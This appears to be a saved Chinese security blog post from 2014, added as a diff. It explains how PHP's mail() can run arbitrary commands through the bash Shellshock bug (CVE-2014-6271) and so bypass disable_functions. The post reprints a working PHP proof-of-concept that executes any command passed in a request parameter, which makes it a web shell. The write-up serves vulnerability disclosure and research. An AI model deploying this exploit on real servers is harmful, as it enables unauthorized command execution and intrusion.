@@ -1,0 +1,341 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>PHP Execute Command Bypass Disable_functions | 离别歌</title>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/styles.css" rel="stylesheet"/>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/style.css" rel="stylesheet"/>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./PHP Execute Command Bypass Disable_functions  离别歌/jquery.min.js"></script>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/code.css" rel="stylesheet"/>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/button.css" rel="stylesheet"/>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./PHP Execute Command Bypass Disable_functions  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html&amp;text=PHP%20Execute%20Command%20Bypass%20Disable_functions"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html&amp;title=PHP%20Execute%20Command%20Bypass%20Disable_functions"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html&amp;is_video=false&amp;description=PHP%20Execute%20Command%20Bypass%20Disable_functions"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=PHP%20Execute%20Command%20Bypass%20Disable_functions&amp;body=Check out this article: https%3A//www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html&amp;title=PHP%20Execute%20Command%20Bypass%20Disable_functions"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html&amp;title=PHP%20Execute%20Command%20Bypass%20Disable_functions"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html&amp;title=PHP%20Execute%20Command%20Bypass%20Disable_functions"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html&amp;title=PHP%20Execute%20Command%20Bypass%20Disable_functions"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html&amp;name=PHP%20Execute%20Command%20Bypass%20Disable_functions&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">PHP Execute Command Bypass Disable_functions</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年11月19日 15:01" itemprop="datePublished">
+                    2014 十一月 19 15:01
+                </time>
+</div>
+<div class="article-tag">
+            阅读：4497
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PHP">PHP</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E">破壳漏洞</a>,
+                
+                <a class="tag-link" href="/tag/disable_functions">disable_functions</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>先简单说一下php调用mail()函数的过程。 <br>
+看到源码ext/mail.c </br></p>
+<p>236行： </p>
+<div class="codehilite"><pre><span></span>char *sendmail_path = INI_STR("sendmail_path"); 
+char *sendmail_cmd = NULL;
+</pre></div>
+<p>从INI中获得sendmail_path变量。我们看看php.ini里是怎么说明的： </p>
+<div class="codehilite"><pre><span></span>; For Unix only.  You may supply arguments as well (default: "sendmail -t -i"). 
+;sendmail_path =
+</pre></div>
+<p>注释中可以看到，send_mail默认值为"sendmail -t -i". </p>
+<p>extra_cmd（用户传入的一些额外参数）存在的时候，调用spprintf将sendmail_path和extra_cmd组合成真正执行的命令行sendmail_cmd 。不存在则直接将sendmail_path赋值给sendmail_cmd 。 <br>
+如下： </br></p>
+<div class="codehilite"><pre><span></span>if (!sendmail_path) { 
+#if (defined PHP_WIN32 || defined NETWARE) 
+    /* handle old style win smtp sending */ 
+    if (TSendMail(INI_STR("SMTP"), &amp;tsm_err, &amp;tsm_errmsg, hdr, subject, to, message, NULL, NULL, NULL TSRMLS_CC) == FAILURE) { 
+      if (tsm_errmsg) { 
+        php_error_docref(NULL TSRMLS_CC, E_WARNING, "%s", tsm_errmsg); 
+        efree(tsm_errmsg); 
+      } else { 
+        php_error_docref(NULL TSRMLS_CC, E_WARNING, "%s", GetSMErrorText(tsm_err)); 
+      } 
+      MAIL_RET(0); 
+    } 
+    MAIL_RET(1); 
+#else 
+    MAIL_RET(0); 
+#endif 
+  } 
+  if (extra_cmd != NULL) { 
+    spprintf(&amp;sendmail_cmd, 0, "%s %s", sendmail_path, extra_cmd); 
+  } else { 
+    sendmail_cmd = sendmail_path; 
+  }
+</pre></div>
+<p>之后执行： </p>
+<div class="codehilite"><pre><span></span><span class="cp">#ifdef PHP_WIN32 </span>
+  <span class="n">sendmail</span> <span class="o">=</span> <span class="n">popen_ex</span><span class="p">(</span><span class="n">sendmail_cmd</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span> <span class="n">TSRMLS_CC</span><span class="p">);</span> 
+<span class="cp">#else </span>
+  <span class="cm">/* Since popen() doesn't indicate if the internal fork() doesn't work </span>
+<span class="cm">   * (e.g. the shell can't be executed) we explicitly set it to 0 to be </span>
+<span class="cm">   * sure we don't catch any older errno value. */</span> 
+  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
+  <span class="n">sendmail</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="n">sendmail_cmd</span><span class="p">,</span> <span class="s">"w"</span><span class="p">);</span> 
+<span class="cp">#endif</span>
+</pre></div>
+<p>将sendmail_cmd丢给popen执行。 <br/>
+如果系统默认sh是bash，popen会派生bash进程。而之前的bash破壳（CVE-2014-6271）漏洞，直接导致我们可以利用mail()函数执行任意命令，绕过disable_functions。 </p>
+<p>同样，我们搜索一下php的源码，可以发现，明里调用popen派生进程的php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。</p>
+<p>影响版本：php 5.x 已测试，其他版本未测试</p>
+<p>修复方法：修复CVE-2014-6271 </p>
+<p>给出POC（<a href="http://www.exploit-db.com/exploits/35146/"><a href="http://www.exploit-db.com/exploits/35146/">http://www.exploit-db.com/exploits/35146/</a></a>）如下： </p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span> 
+<span class="c1"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span>
+<span class="c1"># Google Dork: none </span>
+<span class="c1"># Date: 10/31/2014 </span>
+<span class="c1"># Exploit Author: Ryan King (Starfall) </span>
+<span class="c1"># Vendor Homepage: http://php.net </span>
+<span class="c1"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span>
+<span class="c1"># Version: 5.* (tested on 5.6.2) </span>
+<span class="c1"># Tested on: Debian 7 and CentOS 5 and 6 </span>
+<span class="c1"># CVE: CVE-2014-6271 </span>
+
+<span class="k">function</span> <span class="nf">shellshock</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Execute a command via CVE-2014-6271 @mail.c:283 </span>
+   <span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">tempnam</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span><span class="s2">"data"</span><span class="p">);</span> 
+   <span class="nb">putenv</span><span class="p">(</span><span class="s2">"PHP_LOL=() { x; }; </span><span class="si">$cmd</span><span class="s2"> &gt;</span><span class="si">$tmp</span><span class="s2"> 2&gt;&amp;1"</span><span class="p">);</span> 
+   <span class="c1">// In Safe Mode, the user may only alter environment variableswhose names </span>
+   <span class="c1">// begin with the prefixes supplied by this directive. </span>
+   <span class="c1">// By default, users will only be able to set environment variablesthat </span>
+   <span class="c1">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span>
+   <span class="c1">// PHP will let the user modify ANY environment variable! </span>
+   <span class="nb">mail</span><span class="p">(</span><span class="s2">"a@127.0.0.1"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">"-bv"</span><span class="p">);</span> <span class="c1">// -bv so we don't actuallysend any mail </span>
+   <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 
+   <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 
+   <span class="k">if</span><span class="p">(</span><span class="nv">$output</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span> <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span> 
+   <span class="k">else</span> <span class="k">return</span> <span class="s2">"No output, or not vuln."</span><span class="p">;</span> 
+<span class="p">}</span> 
+<span class="k">echo</span> <span class="nx">shellshock</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span> 
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201411/6bc21416380703.jpg"><img alt="006.jpg" src="./PHP Execute Command Bypass Disable_functions  离别歌/thum-6bc21416380703.jpg"/></a></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-1955">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP Execute Command Bypass Disable_functions  离别歌/a6a08f57930b4088bb864aa73d0276ed.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.zhongguohelanwang.com/" target="_blank">荷兰网</a>
+<time datetime="2015年3月11日 11:14" itemprop="datePublished">
+                            2015 三月 11 11:14
+                        </time>
+<a href="javascript:reply_to('1955', '荷兰网')">回复</a>
+</p>
+<p class="comment-meta">好文章，内容气贯长虹.</p>
+</div>
+</div>
+<div class="row" id="comment-1878">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP Execute Command Bypass Disable_functions  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">xiao_hen</a>
+<time datetime="2014年12月4日 10:15" itemprop="datePublished">
+                            2014 十二月 04 10:15
+                        </time>
+<a href="javascript:reply_to('1878', 'xiao_hen')">回复</a>
+</p>
+<p class="comment-meta">哈哈，谢谢分享</p>
+</div>
+</div>
+<div class="row" id="comment-1851">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP Execute Command Bypass Disable_functions  离别歌/9a19d37beeaa1f24aeeda8bcdf9d1ac6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.henghost.com" target="_blank">香港服务器</a>
+<time datetime="2014年11月20日 15:54" itemprop="datePublished">
+                            2014 十一月 20 15:54
+                        </time>
+<a href="javascript:reply_to('1851', '香港服务器')">回复</a>
+</p>
+<p class="comment-meta">我这里有个网站主机的guanggao推荐给你如何？如果可以的话，请加我qq</p>
+</div>
+</div>
+<div class="row" id="comment-1849">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP Execute Command Bypass Disable_functions  离别歌/9a19d37beeaa1f24aeeda8bcdf9d1ac6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.henghost.com" target="_blank">香港服务器</a>
+<time datetime="2014年11月20日 15:37" itemprop="datePublished">
+                            2014 十一月 20 15:37
+                        </time>
+<a href="javascript:reply_to('1849', '香港服务器')">回复</a>
+</p>
+<p class="comment-meta">我这里有个网站主机的广告推荐给你如何？如果可以的话，请加我qq:2954243953</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1850">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP Execute Command Bypass Disable_functions  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年11月20日 15:45" itemprop="datePublished">
+                            2014 十一月 20 15:45
+                        </time>
+<a href="javascript:reply_to('1850', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@香港服务器：博客暂时不放广告，抱歉~</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1848">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./PHP Execute Command Bypass Disable_functions  离别歌/9a19d37beeaa1f24aeeda8bcdf9d1ac6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.henghost.com" target="_blank">香港服务器</a>
+<time datetime="2014年11月20日 15:29" itemprop="datePublished">
+                            2014 十一月 20 15:29
+                        </time>
+<a href="javascript:reply_to('1848', '香港服务器')">回复</a>
+</p>
+<p class="comment-meta">亲，我这里有个网站主机的广告推荐给你如何？如果可以的话，请加我qq:2954243953</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="2122b2db0329021215336276d62809efc32b093a"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./PHP Execute Command Bypass Disable_functions  离别歌/2122b2db0329021215336276d62809efc32b093a"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="336">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="5M5Ua44ScCFHTmTVrGQ3y18Ggwzf8eBeD6qqYyg7Dpz6T1hafXkN7FaLpA2nRIqo"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./PHP Execute Command Bypass Disable_functions  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./PHP Execute Command Bypass Disable_functions  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
